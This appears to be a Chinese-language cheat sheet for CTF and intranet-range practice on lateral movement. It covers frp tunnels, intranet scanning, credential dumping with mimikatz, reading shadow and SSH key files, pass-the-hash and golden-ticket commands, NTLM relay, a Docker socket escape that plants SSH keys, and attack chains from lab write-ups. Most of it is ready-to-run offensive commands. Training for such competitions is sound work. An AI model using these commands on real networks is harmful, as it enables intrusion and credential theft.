# 横向移动方法总结

## 总览

> **用途**: 内网靶场 / AWD / 渗透比赛中，拿到一台机器后**如何打下一台**。\
> **来源**: 本地赛事资料整理。
> **定位**: 提权之后的下一步 — 见 [提权方法总结](提权方法总结.md)（拿本机权限）→ 本文（打下一台）→ 域控。\
> **关联**: [Web 漏洞 Getshell 总索引](web漏洞getshell/README.md)

***

## 零、横向移动的 5 个环节

```plain
① 立足点建立（代理/隧道）→ ② 信息收集（扫内网）→ ③ 凭据获取（抓 hash/密码）
→ ④ 认证复用（PtH/PtT/票据）→ ⑤ 目标执行（wmiexec/PsExec/服务）
```

**核心逻辑**：横向 = **凭据复用** + **通道打通**。拿到 hash/密码后，用它去连下一台。

***

## 一、① 通道打通（代理 / 隧道）★★

内网机器无法直接访问时，必须先建立通道。

| 工具 | 说明 | 出处 |
| --- | --- | --- |
| **frp**（最常用） | 内网机器主动连 VPS，把内网端口映射出来 | 春秋云镜 Initial / Brute4Road（贯穿整条链） |
| **EarthWorm (ew)** | SOCKS5 代理，支持多级级联 | 通用 |
| **Neo-reGeorg / reGeorg** | 通过 Web 脚本建立隧道（HTTP 隧道） | 通用 |
| **Stowaway** | 多级代理管理 | 通用 |
| **nps** | 轻量内网穿透 | 通用 |
| **CS / MSF** | `portfwd` / `socks` 模块 | 通用 |
| **端口转发上线 CS 马** | 见 WP | `2022柏鹭杯` |

### frp 典型配置

```properties
# frpc.ini（内网机器上运行）
[common]
server_addr = VPS_IP
server_port = 7000

[socks5]
type = tcp
remote_port = 1080
plugin = socks5
```

```bash
# 内网机器启动
./frpc -c frpc.ini
# VPS 上即可通过 1080 端口访问内网
proxychains4 curl http://172.16.200.78/
```

### Docker 逃逸后的通道

```bash
# Docker 2375 未授权 → 挂载宿主机 → 写 SSH 公钥
docker -H tcp://IP:2375 run -it -v /:/mnt --entrypoint /bin/bash ubuntu:18.04
echo ssh-rsa ... > /mnt/root/.ssh/authorized_keys
ssh root@IP                       # 直接拿到宿主机
```

出处: `春秋云镜Unauthorized.meta.md`

## 二、② 信息收集（扫内网）

```bash
# 存活扫描
fping -a -g 172.16.200.0/24
nmap -sn 172.16.200.0/24

# 端口 + 服务
nmap -sV -Pn 172.16.200.0/24
nmap -sS -p 22,80,445,1433,3306,3389,6379 172.16.200.0/24

# 本机网络信息
ip a; netstat -antp; arp -a
cat /etc/hosts; route -n
```

**WP 实战**（春秋云境 Powergrid）：

```plain
fping 172.16.200.0/24
→ 发现 172.16.200.78 (DATA 服务器)
        172.16.200.81 (MySQL)
        172.16.200.76 (Windows)
        172.16.200.87 (OpenVPN)
```

**域内信息收集**：

```bash
bloodhound-python -u user -p pass -d domain.local -ns DC_IP -c All
# 或用 Sharphound（Windows）
```

## 三、③ 凭据获取（抓密码 / Hash）★★

横向的前提是**拿到下一台的凭据**。

### 3.1 Windows 抓 hash

| 工具 | 命令 | 出处 |
| --- | --- | --- |
| **mimikatz** | `sekurlsa::logonpasswords` dump 内存明文/哈希 | 春秋云镜 Unauthorized |
| **kiwi**（MSF） | `kiwi_cmd sekurlsa::logonpasswords` | 春秋云镜 Initial |
| **lsadump** | `lsadump::sam` / `lsadump::dcsync` | 通用 |
| **procdump + mimikatz** | dump lsass 离线解析 | 通用 |

```bash
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
```

### 3.2 Linux 凭据

```bash
cat /etc/shadow                          # 提权后
cat ~/.bash_history                      # 历史泄露
cat ~/.ssh/id_rsa                        # SSH 私钥
find / -name "*.conf" -o -name "*.ini"   # 配置文件密码
grep -ri "password" /var/www/ 2>/dev/null
cat /var/www/html/config.php             # web 配置
```

**WP 案例**：

* `application.yml` 找 MySQL 密码 `rjS8K2RW7KE4E1vk`（春秋云境 Powergrid）
* `/opt/jumpserver/config/config.txt` 找 `BOOTSTRAP_TOKEN`（上海磐石行动）
* `zabbix.userdirectory_ldapG` 凭据 dump（云境 GreatWall2025）

### 3.3 数据库凭据横向

```bash
mysql -h 172.16.200.81 -u root -p'<password>' web
# 一个库的密码常被复用到其它服务
```

## 四、④ 认证复用（PtH / PtT / 票据）★★

### 4.1 哈希传递（Pass-the-Hash）

**无需破解密码**，直接用 NTLM hash 认证。详细原理、适用条件与检测方式见 [哈希传递（Pass-the-Hash）](../02-红队/内网认证/Pass-the-Hash.md)。

```bash
# impacket 系列
impacket-wmiexec administrator@IP -hashes :<ntlm_hash> -codec gbk
impacket-psexec administrator@IP -hashes :<ntlm>
impacket-smbexec administrator@IP -hashes :<ntlm>
impacket-atexec administrator@IP -hashes :<ntlm> 'whoami'

# CrackMapExec / NetExec
nxc smb 172.16.200.78 -u administrator -H da6df19610... -x 'type C:\flag.txt'
crackmapexec smb 172.16.200.78 -u administrator -H <hash>

# 开启 PtH（部分环境需关 RestrictedAdmin）
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0
```

出处: 春秋云境 Powergrid / `Ichunqiu云境Exchange`

### 4.2 票据传递（Pass-the-Ticket）

```bash
# 黄金票据（伪造 TGT）
kerberos::golden /user:administrator /domain:xiaorang.lab \
  /sid:S-1-5-21-314492864-3856862959-4045974917-502 \
  /krbtgt:fb812eea13a18b7fcdb8e6d67ddc205b /ptt

# 白银票据（伪造服务票据）
kerberos::golden /domain:x.lab /sid:S-1-5-21-... /target:server.x.lab \
  /service:cifs /rc4:<machine_hash> /user:administrator /ptt

# Rubeus 申请票据
Rubeus.exe asktgt /user:user /rc4:<hash> /ptt
Rubeus.exe s4u /self /impersonateuser:Administrator \
  /altservice:CIFS/DC02.xiaorang.lab /ptt
```

出处: 春秋云镜 Initial / Unauthorized

### 4.3 NTLM 中继 ★

**原理**: 强制目标机器认证回连，把认证中继到 LDAP/SMB。

```plain
Exchange system 触发 WebDAV 回连 → 中继到 LDAP → 给用户加 dcsync 权限
```

工具: `Responder` + `ntlmrelayx.py`\
出处: `Ichunqiu云境Exchange.meta.md`

```bash
# 1.  responder 触发回连
responder -I eth0 -wv
# 2. 中继到 LDAP
ntlmrelayx.py -t ldap://DC_IP -smb2support --escalate-user <user>
```

## 五、⑤ 目标执行（远程命令）

| 工具 | 协议 | 特点 | 出处 |
| --- | --- | --- | --- |
| **wmiexec** | WMI | 最隐蔽，无文件落地 | 春秋云镜 Brute4Road |
| **psexec** | SMB | 会写服务，易被杀 | 上海磐石行动 |
| **smbexec** | SMB | 半交互 | 通用 |
| **atexec** | 计划任务 | 通过 schtasks | 通用 |
| **WinRM** | 5985/5986 | PowerShell 远程 | 通用 |
| **RDP** | 3389 | 图形 | 2022QWB\_final\_RDP |
| **SSH** | 22 | Linux/网络设备 | 通用 |

```bash
# wmiexec（推荐，无文件）
impacket-wmiexec administrator@IP -hashes :<hash>

# 执行单条命令
nxc smb IP -u admin -p pass -x 'type C:\Users\Administrator\Desktop\flag.txt'
nxc smb IP -u admin -H <hash> -X 'powershell -c "Get-Content C:\flag.txt"'
```

## 六、典型横向链（WP 实例）★★

### 6.1 春秋云镜 Brute4Road（最完整）

```plain
Redis 主从 getshell → SUID 提权读 flag1 → frp 内网代理
→ wpscan 扫到 WPCargo → CVE-2021-25003 RCE
→ MSSQL 爆破 → xp_cmdshell → SweetPotato 提权 system
→ mimikatz 导出 MSSQLSERVER$ NT hash
→ Rubeus asktgt → S4U2Self 申请 LDAP 票据
→ DCSync 导出域管 → wmiexec 登录 DC
```

### 6.2 春秋云境 MagicRelay

```plain
Redis 未授权 DLL 劫持上线 CS → 内网扫描
→ 向日葵 RCE 加管理员 → SweetPotato 提权
→ certify 收集 AD CS 信息 → CVE-2022-26923 域提权
→ passthecert 打 RBCD → 申请 CIFS 票据 impersonate Administrator
→ DCSync 导出域管哈希 → PtH 到 WIN-AUTHORITY
```

### 6.3 春秋云镜 Unauthorized

```plain
Docker 2375 未授权 → 挂载宿主机 -v /:/mnt
→ 写 /root/.ssh/authorized_keys → SSH 登录宿主机
→ MySQL 弱口令 → nmap 扫内网 → FTP 匿名 + ASP webshell
→ SweetPotato 提权 → mimikatz logonpasswords
→ Whisker 添加 DC02$ 机器证书 → Rubeus S4U2Self
→ DCSync → wmiexec 登录 DC02
```

### 6.4 Ichunqiu 云境 Exchange

```plain
Fastjson JDBC 反序列化 RCE
→ 内网 Exchange Proxylogon (CVE-2021-26855) → system
→ 收集 exchange 机器账户 hash（有 writedacl 权限）
→ NTLM Relay：system 触发 WebDAV 回连 → 中继 LDAP → 给用户加 dcsync 权限
→ DCSync 拿域管 hash → 横向下一台
```

### 6.5 云境 GreatWall2025

```plain
Spring Cloud Gateway RCE 写 SSH 公钥
→ cdk_linux 容器逃逸 mount-procfs /host/proc 写 authorized_keys
→ JdbcRowSetImpl RMI 反弹 shell
→ mysql zabbix 凭据 dump → bloodhound-ce 域渗透
→ nxc smb 读 Administrator 桌面 flag
```

### 6.6 上海磐石行动（多场景）

```plain
场景1: SQLServer 弱口令 + xp_cmdshell + badpotato + hash 传递 + noPac 域提权
场景2: Confluence RCE + Vim-SUID + MySQL UDF + Redis + 向日葵 RCE + ADCS + SID History
场景3: WebLogic SSRF + Redis + Zabbix 读 JumpServer config → Log4j 打 vcenter
场景4: Solr CVE-2019-0193 + Oracle + BloodHound dcsync
```

## 七、凭据复用速查表

| 拿到的东西 | 能做什么 |
| --- | --- |
| **明文密码** | `nxc smb IP -u user -p pass` / SSH / RDP |
| **NTLM hash** | PtH：`wmiexec -hashes :<hash>` |
| **机器账户 hash** | 白银票据 / S4U2Self |
| **krbtgt hash** | 黄金票据（域内无敌） |
| **服务账户 hash** | 白银票据（特定服务） |
| **SSH 私钥** | `ssh -i id_rsa user@IP` |
| **数据库密码** | 横向数据库 + 常被复用到其它服务 |
| **AK/SK（云）** | 云 API 调用 |
